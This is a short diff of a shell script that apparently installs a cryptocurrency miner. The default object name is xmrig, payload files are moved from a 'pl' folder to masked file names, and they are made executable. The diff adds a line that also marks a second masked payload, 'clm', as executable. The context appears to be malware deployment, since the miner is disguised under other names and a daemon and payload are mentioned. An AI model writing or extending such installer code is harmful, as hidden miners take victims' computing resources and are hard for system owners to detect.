@@ -23,6 +23,7 @@ OBJ_NAME=${OBJ_NAME:-xmrig}
 [ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
 [ ! -e "$CLM_MASK" ] && mv pl/clm "$CLM_MASK"
 chmod +x "${OBJ_MASK}" &>/dev/null
+chmod +x "${CLM_MASK}" &>/dev/null
 
 ## daemon
 # (when not included in the payload or is not a function)
